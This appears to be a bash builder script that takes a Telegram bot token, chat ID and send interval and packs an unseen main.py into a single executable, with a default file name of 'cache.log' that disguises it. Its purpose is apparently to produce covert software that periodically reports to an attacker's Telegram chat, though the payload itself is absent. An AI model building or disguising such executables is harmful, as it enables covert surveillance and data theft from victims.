#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
WHITE='\033[0;37m'
NC='\033[0m'

echo -e "${WHITE}                   _.-, 
              _ .-'  / .._
           ${BLUE}.-:'${WHITE}/ - - \ ${BLUE}:::::-.
         ${BLUE}.:::${WHITE} '  e e  ' ${BLUE}'-::::.${NC}       
        ${BLUE}::::'${WHITE}(    ^    )${BLUE}_.::::::${NC}      
       ${BLUE}::::.'${WHITE} '.  o   .'${BLUE}.::::'${WHITE}.'/_
   ${WHITE}.  ${BLUE}:::.'${WHITE}       -${BLUE}   .::::'${WHITE}_   _.${BLUE}:
 ${WHITE}.-''---' .'|      ${BLUE}.::::'${WHITE}   '''${BLUE}::::
${WHITE}'.${BLUE} ..-:::'${WHITE}  |    ${BLUE}.::::'${WHITE}        ${BLUE}::::
${WHITE} '.' ${BLUE}::::${WHITE}    \ ${BLUE}.::::'${WHITE}          ${BLUE}::::
      ${BLUE}::::   .::::'${WHITE}           ${BLUE}::::
       ${BLUE}::::.::::'${WHITE}._          ${BLUE}::::
        ${BLUE}::::::' /${WHITE}  '-      ${BLUE}.::::
         ${BLUE}'::::-/__${WHITE}      ${BLUE}.-::::'
           ${BLUE}'-::::::::::::::-'   ${WHITE}Created by: ${BLUE}RykerWilder
               '''::::'''${NC}"


# Main Python script name
SCRIPT_NAME="main.py"

# Ask user for executable name
echo -e -n "${GREEN}Enter the name for the executable: ${NC}"
read APP_NAME

# Use default name if input is empty
if [ -z "$APP_NAME" ]; then
    APP_NAME="cache.log"
    echo -e "${YELLOW}No name provided. Using default: $APP_NAME${NC}"
fi

# Ask for Telegram credentials
echo -e "${GREEN}=== Telegram Configuration ===${NC}"

echo -e -n "${GREEN}Enter your Telegram Bot Token: ${NC}"
read BOT_TOKEN

echo -e -n "${GREEN}Enter your Telegram Chat ID: ${NC}"
read CHAT_ID

echo -e -n "${GREEN}Enter send interval in seconds (default: 300): ${NC}"
read SEND_INTERVAL

# Use default interval if empty
if [ -z "$SEND_INTERVAL" ]; then
    SEND_INTERVAL=300
    echo -e "${YELLOW}No interval provided. Using default: 600 seconds (10 minutes)${NC}"
fi

# Create .env file
echo -e "${GREEN}Creating .env file...${NC}"
cat > .env << EOF
BOT_TOKEN=$BOT_TOKEN
CHAT_ID=$CHAT_ID
SEND_INTERVAL=$SEND_INTERVAL
EOF

echo -e "${GREEN}.env file created successfully!${NC}"

# PyInstaller options
ONEFILE="--onefile"  # Creates a single executable file
# ONEDIR="--onedir"  # Alternative: creates a folder with dependencies

# Clean previous builds
echo "Cleaning previous builds..."
rm -rf build dist *.spec

# Create the executable with .env file included
echo "Creating executable with PyInstaller..."
pyinstaller $ONEFILE \
    --name "$APP_NAME" \
    --add-data ".env:." \
    --clean \
    --noconfirm \
    "$SCRIPT_NAME"

# Check the result
if [ $? -eq 0 ]; then
    echo -e "${GREEN}Executable successfully created at: dist/$APP_NAME${NC}"
else
    echo -e "${RED}Error creating executable${NC}"
    exit 1
fi
